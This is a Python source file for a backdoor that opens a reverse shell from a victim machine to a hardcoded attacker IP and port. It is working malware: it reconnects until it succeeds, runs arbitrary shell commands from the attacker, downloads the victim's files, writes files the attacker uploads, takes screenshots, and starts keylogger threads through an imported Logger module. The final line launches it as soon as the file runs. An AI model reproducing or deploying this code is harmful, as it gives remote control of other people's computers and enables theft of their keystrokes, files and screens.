# -*- coding: utf-8 -*-
# Author: Yiğit Şık 06/11/2021

# This script will establish the reverse shell connection between attacker and victim machine
# Commands taken from attacker will be executed through this script on victim computer,
# then the results will be sent back

# Built-in Modules
import time
from queue import Queue
import os
import socket
import base64
import subprocess
import threading
import json

# User Defined Modules
from Logger import Logger


class Backdoor:
    NUMBER_OF_THREADS = 4
    JOB_NUMBER = [1, 2, 3]
    queue = Queue()
    Ip = "192.168.79.128"
    Port = 4444

    # Initialize the socket connection via constructor with the given ip and port value
    def __init__(self):
        self.connection = None
        self.logger = Logger()
        self.create_workers()
        self.create_jobs()

    # ****************** THREAD POOL ******************************************************************

    # Thread pool pattern makes it easy to observe and manage threads
    # Reduces the costs occur when creating and deleting threads

    def create_workers(self):
        for _ in range(self.NUMBER_OF_THREADS):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):

        while True:
            x = self.queue.get()

            if x == 1:
                self.logger.key_logger()
            elif x == 2:
                self.logger.write_file()
            if x == 3:
                try:
                    self.connect_to_server(self.Ip, self.Port)
                    self.queue.put(5)
                except Exception as msg:
                    print(msg)
            elif x == 5:
                self.run()

            self.queue.task_done()

    def create_jobs(self):
        for x in self.JOB_NUMBER:
            self.queue.put(x)
        self.queue.join()

    # ****************** THREAD POOL ******************************************************************

    def connect_to_server(self, ip, port):

        succeeded = False
        retry_interval = 5

        while succeeded is False:

            try:
                # TCP Connection
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
                succeeded = True
                print("Connected!")
            except Exception as msg:
                print("An attempt to connect server has failed "+str(msg))
                print("Will Retry in {} seconds".format(retry_interval))
                time.sleep(retry_interval)

    # Execute given command string in shell
    def execute_system_command(self, command):
        command = " ".join(command)
        task = subprocess.Popen(args=command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        stdout, stderr = task.communicate()
        output_byte = stdout + stderr
        output_str = output_byte.decode()
        return output_str

    # Send Messages as Json format for data integrity purposes
    # Sending data plainly might cause problems because end of the data stream cannot be known
    def __send_data(self, data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    # Read data in 1024 byte chunks until json file is fully received
    def __receive_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    # Change directory to given path. Equivalent of "cd" command
    def __change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except OSError as e:
            return e.strerror

    # Read and write files in base64 format to transfer bytes reliably.
    def __read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def __write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    # Here we are waiting commands from attacker machine in an infinite loop
    def run(self):

        while True:

            command_result = ""

            # Wait (This is a blocking code) command string from attacker
            command = self.__receive_data()

            # Close the connection
            if command[0] == "exit":
                self.connection.close()
                exit()

            # Change the directory. The default is where this script resides
            elif command[0] == "cd":
                try:
                    if len(command) > 1:
                        command_result = self.__change_working_directory_to(command[1])
                    else:
                        command_result = self.execute_system_command(command[0])
                except Exception as e:
                    self.__send_data(e)
                    continue

            # Send files from victim to attacker
            elif command[0] == "download":
                try:
                    command_result = self.__read_file(command[1]).decode()
                except FileNotFoundError:
                    self.__send_data("Cannot find the file specified")
                    continue

            # Write files that attacker sends
            elif command[0] == "upload":
                try:
                    command_result = self.__write_file(command[1], command[2])
                except FileNotFoundError:
                    self.__send_data("Cannot find the file specified")
                    continue

            # Take a screenshot and send it to attacker
            elif command[0] == "screenshot":
                image = self.logger.get_screenshot()
                self.__send_data(image)
                continue

            # Check if connection is available
            elif command == 'AreYouAwake?':
                self.__send_data(command)
                continue

            # Execute other builtin commands
            else:
                command_result = self.execute_system_command(command)

            # Send results of commands executed to the attacker
            self.__send_data(command_result)


# Connect to the attacker's computer
my_backdoor = Backdoor()
